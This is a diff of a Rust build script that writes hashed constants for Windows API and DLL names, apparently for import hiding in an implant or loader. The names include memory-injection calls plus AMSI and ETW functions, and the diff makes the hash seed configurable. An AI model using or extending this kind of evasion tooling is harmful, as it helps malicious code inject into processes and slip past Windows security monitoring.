@@ -1,7 +1,6 @@
 use std::env;
 use std::fs;
 use std::path::Path;
-use rand::Rng;
 
 fn hash_str(s: &str, seed: u32) -> u32 {
     let mut hash: u32 = seed;
@@ -12,22 +11,22 @@ fn hash_str(s: &str, seed: u32) -> u32 {
     hash
 }
 
-fn hash_wstr(s: &str, seed: u32) -> u32 {
-    let mut hash: u32 = seed;
-    for c in s.encode_utf16() {
-        let b = c as u16; // Using full 16-bits
-        hash = hash.rotate_right(13) ^ (b as u32);
+fn configured_seed() -> u32 {
+    if let Ok(raw) = env::var("ORCHESTRA_PE_RESOLVE_SEED") {
+        if let Some(hex) = raw.strip_prefix("0x") {
+            return u32::from_str_radix(hex, 16).unwrap_or(0x4f524348);
+        }
+        return raw.parse().unwrap_or(0x4f524348);
     }
-    hash // very simplified
+    0x4f524348 // "ORCH"
 }
 
 fn main() {
     let out_dir = env::var_os("OUT_DIR").unwrap();
     let dest_path = Path::new(&out_dir).join("api_hashes.rs");
-    
-    let mut rng = rand::thread_rng();
-    let seed: u32 = rng.gen();
-    
+
+    let seed = configured_seed();
+
     let apis = [
         "NtAllocateVirtualMemory",
         "NtWriteVirtualMemory",
@@ -40,21 +39,26 @@ fn main() {
         "AmsiInitialize",
         "EtwEventWrite",
     ];
-    let dlls = [
-        "ntdll.dll",
-        "amsi.dll",
-        "kernel32.dll",
-    ];
+    let dlls = ["ntdll.dll", "amsi.dll", "kernel32.dll"];
 
     let mut rs = format!("pub const SEED: u32 = {:#x};\n", seed);
     for api in apis {
-        rs.push_str(&format!("pub const HASH_{}: u32 = {:#x};\n", api.to_uppercase(), hash_str(api, seed)));
+        rs.push_str(&format!(
+            "pub const HASH_{}: u32 = {:#x};\n",
+            api.to_uppercase(),
+            hash_str(api, seed)
+        ));
     }
     for dll in dlls {
         let name = dll.replace(".", "_").to_uppercase();
-        rs.push_str(&format!("pub const HASH_{}: u32 = {:#x};\n", name, hash_str(dll, seed)));
+        rs.push_str(&format!(
+            "pub const HASH_{}: u32 = {:#x};\n",
+            name,
+            hash_str(dll, seed)
+        ));
     }
-    
+
     fs::write(&dest_path, rs).unwrap();
     println!("cargo:rerun-if-changed=build.rs");
+    println!("cargo:rerun-if-env-changed=ORCHESTRA_PE_RESOLVE_SEED");
 }
